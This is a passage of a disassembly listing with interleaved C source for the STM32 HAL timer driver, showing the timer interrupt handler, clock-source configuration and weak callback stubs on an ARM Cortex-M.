  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004ebc:	68bb      	ldr	r3, [r7, #8]
 8004ebe:	f003 0308 	and.w	r3, r3, #8
 8004ec2:	2b00      	cmp	r3, #0
 8004ec4:	d020      	beq.n	8004f08 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004ec6:	68fb      	ldr	r3, [r7, #12]
 8004ec8:	f003 0308 	and.w	r3, r3, #8
 8004ecc:	2b00      	cmp	r3, #0
 8004ece:	d01b      	beq.n	8004f08 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004ed0:	687b      	ldr	r3, [r7, #4]
 8004ed2:	681b      	ldr	r3, [r3, #0]
 8004ed4:	f06f 0208 	mvn.w	r2, #8
 8004ed8:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004eda:	687b      	ldr	r3, [r7, #4]
 8004edc:	2204      	movs	r2, #4
 8004ede:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004ee0:	687b      	ldr	r3, [r7, #4]
 8004ee2:	681b      	ldr	r3, [r3, #0]
 8004ee4:	69db      	ldr	r3, [r3, #28]
 8004ee6:	f003 0303 	and.w	r3, r3, #3
 8004eea:	2b00      	cmp	r3, #0
 8004eec:	d003      	beq.n	8004ef6 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004eee:	6878      	ldr	r0, [r7, #4]
 8004ef0:	f000 f961 	bl	80051b6 <HAL_TIM_IC_CaptureCallback>
 8004ef4:	e005      	b.n	8004f02 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ef6:	6878      	ldr	r0, [r7, #4]
 8004ef8:	f000 f953 	bl	80051a2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004efc:	6878      	ldr	r0, [r7, #4]
 8004efe:	f000 f964 	bl	80051ca <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004f02:	687b      	ldr	r3, [r7, #4]
 8004f04:	2200      	movs	r2, #0
 8004f06:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004f08:	68bb      	ldr	r3, [r7, #8]
 8004f0a:	f003 0310 	and.w	r3, r3, #16
 8004f0e:	2b00      	cmp	r3, #0
 8004f10:	d020      	beq.n	8004f54 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004f12:	68fb      	ldr	r3, [r7, #12]
 8004f14:	f003 0310 	and.w	r3, r3, #16
 8004f18:	2b00      	cmp	r3, #0
 8004f1a:	d01b      	beq.n	8004f54 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004f1c:	687b      	ldr	r3, [r7, #4]
 8004f1e:	681b      	ldr	r3, [r3, #0]
 8004f20:	f06f 0210 	mvn.w	r2, #16
 8004f24:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004f26:	687b      	ldr	r3, [r7, #4]
 8004f28:	2208      	movs	r2, #8
 8004f2a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004f2c:	687b      	ldr	r3, [r7, #4]
 8004f2e:	681b      	ldr	r3, [r3, #0]
 8004f30:	69db      	ldr	r3, [r3, #28]
 8004f32:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004f36:	2b00      	cmp	r3, #0
 8004f38:	d003      	beq.n	8004f42 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004f3a:	6878      	ldr	r0, [r7, #4]
 8004f3c:	f000 f93b 	bl	80051b6 <HAL_TIM_IC_CaptureCallback>
 8004f40:	e005      	b.n	8004f4e <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004f42:	6878      	ldr	r0, [r7, #4]
 8004f44:	f000 f92d 	bl	80051a2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004f48:	6878      	ldr	r0, [r7, #4]
 8004f4a:	f000 f93e 	bl	80051ca <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004f4e:	687b      	ldr	r3, [r7, #4]
 8004f50:	2200      	movs	r2, #0
 8004f52:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004f54:	68bb      	ldr	r3, [r7, #8]
 8004f56:	f003 0301 	and.w	r3, r3, #1
 8004f5a:	2b00      	cmp	r3, #0
 8004f5c:	d00c      	beq.n	8004f78 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004f5e:	68fb      	ldr	r3, [r7, #12]
 8004f60:	f003 0301 	and.w	r3, r3, #1
 8004f64:	2b00      	cmp	r3, #0
 8004f66:	d007      	beq.n	8004f78 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004f68:	687b      	ldr	r3, [r7, #4]
 8004f6a:	681b      	ldr	r3, [r3, #0]
 8004f6c:	f06f 0201 	mvn.w	r2, #1
 8004f70:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004f72:	6878      	ldr	r0, [r7, #4]
 8004f74:	f7fb fe64 	bl	8000c40 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004f78:	68bb      	ldr	r3, [r7, #8]
 8004f7a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f7e:	2b00      	cmp	r3, #0
 8004f80:	d00c      	beq.n	8004f9c <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f82:	68fb      	ldr	r3, [r7, #12]
 8004f84:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f88:	2b00      	cmp	r3, #0
 8004f8a:	d007      	beq.n	8004f9c <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f8c:	687b      	ldr	r3, [r7, #4]
 8004f8e:	681b      	ldr	r3, [r3, #0]
 8004f90:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f94:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f96:	6878      	ldr	r0, [r7, #4]
 8004f98:	f000 fa9a 	bl	80054d0 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f9c:	68bb      	ldr	r3, [r7, #8]
 8004f9e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004fa2:	2b00      	cmp	r3, #0
 8004fa4:	d00c      	beq.n	8004fc0 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004fa6:	68fb      	ldr	r3, [r7, #12]
 8004fa8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004fac:	2b00      	cmp	r3, #0
 8004fae:	d007      	beq.n	8004fc0 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004fb0:	687b      	ldr	r3, [r7, #4]
 8004fb2:	681b      	ldr	r3, [r3, #0]
 8004fb4:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004fb8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004fba:	6878      	ldr	r0, [r7, #4]
 8004fbc:	f000 fa92 	bl	80054e4 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004fc0:	68bb      	ldr	r3, [r7, #8]
 8004fc2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004fc6:	2b00      	cmp	r3, #0
 8004fc8:	d00c      	beq.n	8004fe4 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004fca:	68fb      	ldr	r3, [r7, #12]
 8004fcc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004fd0:	2b00      	cmp	r3, #0
 8004fd2:	d007      	beq.n	8004fe4 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004fd4:	687b      	ldr	r3, [r7, #4]
 8004fd6:	681b      	ldr	r3, [r3, #0]
 8004fd8:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004fdc:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004fde:	6878      	ldr	r0, [r7, #4]
 8004fe0:	f000 f8fd 	bl	80051de <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004fe4:	68bb      	ldr	r3, [r7, #8]
 8004fe6:	f003 0320 	and.w	r3, r3, #32
 8004fea:	2b00      	cmp	r3, #0
 8004fec:	d00c      	beq.n	8005008 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004fee:	68fb      	ldr	r3, [r7, #12]
 8004ff0:	f003 0320 	and.w	r3, r3, #32
 8004ff4:	2b00      	cmp	r3, #0
 8004ff6:	d007      	beq.n	8005008 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004ff8:	687b      	ldr	r3, [r7, #4]
 8004ffa:	681b      	ldr	r3, [r3, #0]
 8004ffc:	f06f 0220 	mvn.w	r2, #32
 8005000:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8005002:	6878      	ldr	r0, [r7, #4]
 8005004:	f000 fa5a 	bl	80054bc <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8005008:	bf00      	nop
 800500a:	3710      	adds	r7, #16
 800500c:	46bd      	mov	sp, r7
 800500e:	bd80      	pop	{r7, pc}

08005010 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8005010:	b580      	push	{r7, lr}
 8005012:	b084      	sub	sp, #16
 8005014:	af00      	add	r7, sp, #0
 8005016:	6078      	str	r0, [r7, #4]
 8005018:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 800501a:	2300      	movs	r3, #0
 800501c:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 800501e:	687b      	ldr	r3, [r7, #4]
 8005020:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005024:	2b01      	cmp	r3, #1
 8005026:	d101      	bne.n	800502c <HAL_TIM_ConfigClockSource+0x1c>
 8005028:	2302      	movs	r3, #2
 800502a:	e0b6      	b.n	800519a <HAL_TIM_ConfigClockSource+0x18a>
 800502c:	687b      	ldr	r3, [r7, #4]
 800502e:	2201      	movs	r2, #1
 8005030:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8005034:	687b      	ldr	r3, [r7, #4]
 8005036:	2202      	movs	r2, #2
 8005038:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 800503c:	687b      	ldr	r3, [r7, #4]
 800503e:	681b      	ldr	r3, [r3, #0]
 8005040:	689b      	ldr	r3, [r3, #8]
 8005042:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8005044:	68bb      	ldr	r3, [r7, #8]
 8005046:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 800504a:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 800504e:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005050:	68bb      	ldr	r3, [r7, #8]
 8005052:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8005056:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8005058:	687b      	ldr	r3, [r7, #4]
 800505a:	681b      	ldr	r3, [r3, #0]
 800505c:	68ba      	ldr	r2, [r7, #8]
 800505e:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8005060:	683b      	ldr	r3, [r7, #0]
 8005062:	681b      	ldr	r3, [r3, #0]
 8005064:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005068:	d03e      	beq.n	80050e8 <HAL_TIM_ConfigClockSource+0xd8>
 800506a:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 800506e:	f200 8087 	bhi.w	8005180 <HAL_TIM_ConfigClockSource+0x170>
 8005072:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8005076:	f000 8086 	beq.w	8005186 <HAL_TIM_ConfigClockSource+0x176>
 800507a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800507e:	d87f      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 8005080:	2b70      	cmp	r3, #112	; 0x70
 8005082:	d01a      	beq.n	80050ba <HAL_TIM_ConfigClockSource+0xaa>
 8005084:	2b70      	cmp	r3, #112	; 0x70
 8005086:	d87b      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 8005088:	2b60      	cmp	r3, #96	; 0x60
 800508a:	d050      	beq.n	800512e <HAL_TIM_ConfigClockSource+0x11e>
 800508c:	2b60      	cmp	r3, #96	; 0x60
 800508e:	d877      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 8005090:	2b50      	cmp	r3, #80	; 0x50
 8005092:	d03c      	beq.n	800510e <HAL_TIM_ConfigClockSource+0xfe>
 8005094:	2b50      	cmp	r3, #80	; 0x50
 8005096:	d873      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 8005098:	2b40      	cmp	r3, #64	; 0x40
 800509a:	d058      	beq.n	800514e <HAL_TIM_ConfigClockSource+0x13e>
 800509c:	2b40      	cmp	r3, #64	; 0x40
 800509e:	d86f      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 80050a0:	2b30      	cmp	r3, #48	; 0x30
 80050a2:	d064      	beq.n	800516e <HAL_TIM_ConfigClockSource+0x15e>
 80050a4:	2b30      	cmp	r3, #48	; 0x30
 80050a6:	d86b      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 80050a8:	2b20      	cmp	r3, #32
 80050aa:	d060      	beq.n	800516e <HAL_TIM_ConfigClockSource+0x15e>
 80050ac:	2b20      	cmp	r3, #32
 80050ae:	d867      	bhi.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
 80050b0:	2b00      	cmp	r3, #0
 80050b2:	d05c      	beq.n	800516e <HAL_TIM_ConfigClockSource+0x15e>
 80050b4:	2b10      	cmp	r3, #16
 80050b6:	d05a      	beq.n	800516e <HAL_TIM_ConfigClockSource+0x15e>
 80050b8:	e062      	b.n	8005180 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80050ba:	687b      	ldr	r3, [r7, #4]
 80050bc:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80050be:	683b      	ldr	r3, [r7, #0]
 80050c0:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80050c2:	683b      	ldr	r3, [r7, #0]
 80050c4:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80050c6:	683b      	ldr	r3, [r7, #0]
 80050c8:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80050ca:	f000 f971 	bl	80053b0 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 80050ce:	687b      	ldr	r3, [r7, #4]
 80050d0:	681b      	ldr	r3, [r3, #0]
 80050d2:	689b      	ldr	r3, [r3, #8]
 80050d4:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 80050d6:	68bb      	ldr	r3, [r7, #8]
 80050d8:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 80050dc:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 80050de:	687b      	ldr	r3, [r7, #4]
 80050e0:	681b      	ldr	r3, [r3, #0]
 80050e2:	68ba      	ldr	r2, [r7, #8]
 80050e4:	609a      	str	r2, [r3, #8]
      break;
 80050e6:	e04f      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80050e8:	687b      	ldr	r3, [r7, #4]
 80050ea:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80050ec:	683b      	ldr	r3, [r7, #0]
 80050ee:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80050f0:	683b      	ldr	r3, [r7, #0]
 80050f2:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80050f4:	683b      	ldr	r3, [r7, #0]
 80050f6:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80050f8:	f000 f95a 	bl	80053b0 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 80050fc:	687b      	ldr	r3, [r7, #4]
 80050fe:	681b      	ldr	r3, [r3, #0]
 8005100:	689a      	ldr	r2, [r3, #8]
 8005102:	687b      	ldr	r3, [r7, #4]
 8005104:	681b      	ldr	r3, [r3, #0]
 8005106:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 800510a:	609a      	str	r2, [r3, #8]
      break;
 800510c:	e03c      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800510e:	687b      	ldr	r3, [r7, #4]
 8005110:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005112:	683b      	ldr	r3, [r7, #0]
 8005114:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005116:	683b      	ldr	r3, [r7, #0]
 8005118:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800511a:	461a      	mov	r2, r3
 800511c:	f000 f8ce 	bl	80052bc <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005120:	687b      	ldr	r3, [r7, #4]
 8005122:	681b      	ldr	r3, [r3, #0]
 8005124:	2150      	movs	r1, #80	; 0x50
 8005126:	4618      	mov	r0, r3
 8005128:	f000 f927 	bl	800537a <TIM_ITRx_SetConfig>
      break;
 800512c:	e02c      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 800512e:	687b      	ldr	r3, [r7, #4]
 8005130:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005132:	683b      	ldr	r3, [r7, #0]
 8005134:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005136:	683b      	ldr	r3, [r7, #0]
 8005138:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 800513a:	461a      	mov	r2, r3
 800513c:	f000 f8ed 	bl	800531a <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 8005140:	687b      	ldr	r3, [r7, #4]
 8005142:	681b      	ldr	r3, [r3, #0]
 8005144:	2160      	movs	r1, #96	; 0x60
 8005146:	4618      	mov	r0, r3
 8005148:	f000 f917 	bl	800537a <TIM_ITRx_SetConfig>
      break;
 800514c:	e01c      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800514e:	687b      	ldr	r3, [r7, #4]
 8005150:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005152:	683b      	ldr	r3, [r7, #0]
 8005154:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005156:	683b      	ldr	r3, [r7, #0]
 8005158:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800515a:	461a      	mov	r2, r3
 800515c:	f000 f8ae 	bl	80052bc <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 8005160:	687b      	ldr	r3, [r7, #4]
 8005162:	681b      	ldr	r3, [r3, #0]
 8005164:	2140      	movs	r1, #64	; 0x40
 8005166:	4618      	mov	r0, r3
 8005168:	f000 f907 	bl	800537a <TIM_ITRx_SetConfig>
      break;
 800516c:	e00c      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800516e:	687b      	ldr	r3, [r7, #4]
 8005170:	681a      	ldr	r2, [r3, #0]
 8005172:	683b      	ldr	r3, [r7, #0]
 8005174:	681b      	ldr	r3, [r3, #0]
 8005176:	4619      	mov	r1, r3
 8005178:	4610      	mov	r0, r2
 800517a:	f000 f8fe 	bl	800537a <TIM_ITRx_SetConfig>
      break;
 800517e:	e003      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 8005180:	2301      	movs	r3, #1
 8005182:	73fb      	strb	r3, [r7, #15]
      break;
 8005184:	e000      	b.n	8005188 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005186:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005188:	687b      	ldr	r3, [r7, #4]
 800518a:	2201      	movs	r2, #1
 800518c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005190:	687b      	ldr	r3, [r7, #4]
 8005192:	2200      	movs	r2, #0
 8005194:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005198:	7bfb      	ldrb	r3, [r7, #15]
}
 800519a:	4618      	mov	r0, r3
 800519c:	3710      	adds	r7, #16
 800519e:	46bd      	mov	sp, r7
 80051a0:	bd80      	pop	{r7, pc}

080051a2 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 80051a2:	b480      	push	{r7}
 80051a4:	b083      	sub	sp, #12
 80051a6:	af00      	add	r7, sp, #0
 80051a8:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 80051aa:	bf00      	nop
 80051ac:	370c      	adds	r7, #12
 80051ae:	46bd      	mov	sp, r7
 80051b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051b4:	4770      	bx	lr

080051b6 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 80051b6:	b480      	push	{r7}
 80051b8:	b083      	sub	sp, #12
 80051ba:	af00      	add	r7, sp, #0
 80051bc:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 80051be:	bf00      	nop
 80051c0:	370c      	adds	r7, #12
 80051c2:	46bd      	mov	sp, r7
 80051c4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051c8:	4770      	bx	lr

080051ca <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 80051ca:	b480      	push	{r7}
 80051cc:	b083      	sub	sp, #12
 80051ce:	af00      	add	r7, sp, #0
 80051d0:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 80051d2:	bf00      	nop
 80051d4:	370c      	adds	r7, #12
 80051d6:	46bd      	mov	sp, r7
 80051d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051dc:	4770      	bx	lr

080051de <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 80051de:	b480      	push	{r7}
 80051e0:	b083      	sub	sp, #12
 80051e2:	af00      	add	r7, sp, #0
 80051e4:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 80051e6:	bf00      	nop
 80051e8:	370c      	adds	r7, #12
